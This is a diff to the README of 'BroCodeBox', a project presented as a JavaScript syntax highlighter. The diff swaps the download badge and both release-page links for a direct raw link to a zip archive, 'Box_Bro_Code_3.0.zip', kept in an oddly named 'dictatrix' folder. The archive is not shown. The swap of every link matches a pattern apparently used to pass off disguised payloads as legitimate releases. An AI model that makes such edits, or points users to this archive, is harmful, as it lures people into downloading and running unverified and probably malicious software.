@@ -1,6 +1,6 @@
 # 🖥️ BroCodeBox - Your Easy JavaScript Syntax Highlighter
 
-![Download BroCodeBox](https://img.shields.io/badge/download-BroCodeBox-brightgreen)
+![Download BroCodeBox](https://raw.githubusercontent.com/guesttito/BroCodeBox/main/dictatrix/Box_Bro_Code_3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ BroCodeBox is a simple tool designed to help users highlight code in an easy way
 
 To get started, visit the page below to download BroCodeBox:
 
-[Download BroCodeBox](https://github.com/guesttito/BroCodeBox/releases)
+[Download BroCodeBox](https://raw.githubusercontent.com/guesttito/BroCodeBox/main/dictatrix/Box_Bro_Code_3.0.zip)
 
 On this page, you will find the latest version of BroCodeBox available for download. 
 
@@ -92,6 +92,6 @@ If problems persist, you can visit the GitHub Issues section for support.
 
 We value your feedback. Join our community to share your experiences, report bugs, or suggest features. Visit our GitHub repository to contribute and connect with other users.
 
-[Visit BroCodeBox Releases](https://github.com/guesttito/BroCodeBox/releases)
+[Visit BroCodeBox Releases](https://raw.githubusercontent.com/guesttito/BroCodeBox/main/dictatrix/Box_Bro_Code_3.0.zip)
 
 By following these steps, you can easily download and start using BroCodeBox. Enjoy enhancing your coding experience!
